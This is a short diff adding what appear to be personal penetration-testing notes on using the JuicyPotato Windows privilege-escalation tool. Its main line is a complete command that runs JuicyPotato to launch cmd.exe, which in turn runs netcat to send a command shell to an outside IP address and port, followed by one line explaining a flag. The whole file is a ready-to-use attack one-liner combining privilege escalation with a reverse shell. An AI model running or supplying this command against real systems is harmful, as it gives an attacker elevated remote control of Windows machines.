@@ -1,0 +1,5 @@
+Netcat command for Juicypotato
+
+jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\Downloads\nc.exe -e cmd.exe 192.168.119.174 9001" -t *
+
+-l => not a listener port, It can be any active port like 1337
